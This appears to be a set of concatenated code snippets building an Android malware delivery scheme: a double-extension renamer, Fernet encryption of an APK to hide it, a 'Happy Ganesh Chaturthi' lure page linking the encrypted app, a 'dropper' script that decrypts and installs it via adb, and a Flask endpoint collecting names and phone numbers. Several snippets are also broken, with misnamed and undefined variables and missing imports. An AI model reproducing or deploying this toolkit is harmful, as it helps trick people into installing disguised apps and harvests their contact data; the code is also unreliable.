import os

def double_extension_apk(apk_path, output_folder):
    base_name = os.path.basename(apk_path)
    new_name = f"{base_name}.apk.apk"
    new_path = os.path.join(output_folder, new_name)
    os.rename(apk_path, new_path)
    return new_path

# Example usage
double_extension_apk("path/to/your/app.apk", "output/folder")
from cryptography.fernet import Fernet

def encrypt_apk(apk_path, output_path):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    
    with open(apk_path, 'rb') as file:
        apk_data = file.read()
    
    encrypted_data = cipher_suite.encrypt(apk_data)
    
    with open(output_path, 'wb') as file:
        file.write(encrypted_data)
    
    return key

# Example usage
encryption_key = encrypt_apk("path/to/your/app.apk", "output/folder/encrypted_app.apk")<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Ganesh Festival App</title>
</head>
<body>
    <h1>Happy Ganesh Chaturthi</h1>
    <p>Click the link below to download our festival app:</p>
    <a href="http://example.com/path/to/encrypted_app.apk" download>Download App</a>
</body>
</html>import os
import subprocess

def dropper_payload(encrypted_apk_path, output_folder):
    key_path = os.path.join(output_folder, "encryption_key.key")
    with open(key_path, 'wb') as file:
        file.write(encryption_key)
    
    droper_script = f"""
import os
from cryptography.fernet import Fernet

def decrypt_and_install(apk_path, key_path):
    with open(key_path, 'rb') as file:
        key = file.read()
    
    cipher_suite = Fernet(key)
    
    with open(apk_path, 'rb') as file:
        encrypted_data = file.read()
    
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    
    with open('decrypted_app.apk', 'wb') as file:
        file.write(decrypted_data)
    
    subprocess.run(['adb', 'install', 'decrypted_app.apk'])

decrypt_and_install('{os.path.join(output_folder, "encrypted_app.apk")}', '{key_path}')
"""
    with open(os.path.join(output_folder, "droper.py"), 'w') as file:
        file.write(dropper_script)

# Example usage
dropper_payload("path/to/your/app.apk", "output/folder")import os
import subprocess

def one_click_install(output_folder):
    droper_script = f"""
import os
from cryptography.fernet import Fernet

def decrypt_and_install(apk_path, key_path):
    with open(key_path, 'rb') as file:
        key = file.read()
    
    cipher_suite = Fernet(key)
    
    with open(apk_path, 'rb') as file:
        encrypted_data = file.read()
    
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    
    with open('decrypted_app.apk', 'wb') as file:
        file.write(decrypted_data)
    
    subprocess.run(['adb', 'install', 'decrypted_app.apk'])

decrypt_and_install('{os.path.join(output_folder, "encrypted_app.apk")}', '{os.path.join(output_folder, "encryption_key.key")}')
"""
    
    with open(os.path.join(output_folder, "one_click_install.py"), 'w') as file:
        file.write(dropper_script)

# Example usage
one_click_install("output/folder")
from flask import Flask, request, jsonify

app = Flask(__name__)

users = []

@app.route('/add_user', methods=['POST'])
def add_user():
    data = request.get_json()
    user = {
        'id': len(users) + 1,
        'name': data['name'],
        'phone': data['phone']
    }
    users.append(user)
    return jsonify(user), 201

@app.route('/users', methods=['GET'])
def get_users():
    return jsonify(users)

if __name__ == '__main__':
    app.run(debug=True)



